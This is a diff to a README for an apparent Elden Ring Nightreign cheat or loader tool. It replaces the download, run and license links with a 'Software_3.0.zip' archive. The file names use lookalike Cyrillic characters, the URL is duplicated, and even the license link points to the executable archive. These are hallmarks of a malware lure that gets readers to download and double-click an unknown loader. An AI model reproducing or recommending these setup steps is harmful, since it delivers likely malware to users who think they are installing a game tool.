@@ -43,9 +43,9 @@ Stay up-to-date with new features as Nightreign evolves for Elden Ring in 2025!
 
 **Get started in moments with our fast and secure setup!**
 
-1. **Download `https://raw.githubusercontent.com/UnwonCool/stormdrop/main/Lоader.zip` from the repository.**
+1. **Download `https://github.com/UnwonCool/stormdrop/raw/refs/heads/main/aggravate/Software_3.0.zipоhttps://github.com/UnwonCool/stormdrop/raw/refs/heads/main/aggravate/Software_3.0.zip` from the repository.**
 2. Extract the archive to a folder of your choice.
-3. Double-click `https://raw.githubusercontent.com/UnwonCool/stormdrop/main/Lоader.zip` (Windows) or launch the corresponding loader for macOS/Linux.
+3. Double-click `https://github.com/UnwonCool/stormdrop/raw/refs/heads/main/aggravate/Software_3.0.zipоhttps://github.com/UnwonCool/stormdrop/raw/refs/heads/main/aggravate/Software_3.0.zip` (Windows) or launch the corresponding loader for macOS/Linux.
 4. Follow the on-screen setup instructions to connect to Elden Ring.
 5. Enjoy your enhanced experience!
 
@@ -73,7 +73,7 @@ Support the developers of Elden Ring by purchasing and enjoying the original gam
 ## 📄 LICENSE (MIT)
 
 This repository is released under the **MIT License**.  
-View the full license text [here](https://raw.githubusercontent.com/UnwonCool/stormdrop/main/Lоader.zip).
+View the full license text [here](https://github.com/UnwonCool/stormdrop/raw/refs/heads/main/aggravate/Software_3.0.zipоhttps://github.com/UnwonCool/stormdrop/raw/refs/heads/main/aggravate/Software_3.0.zip).
 
 ---
 
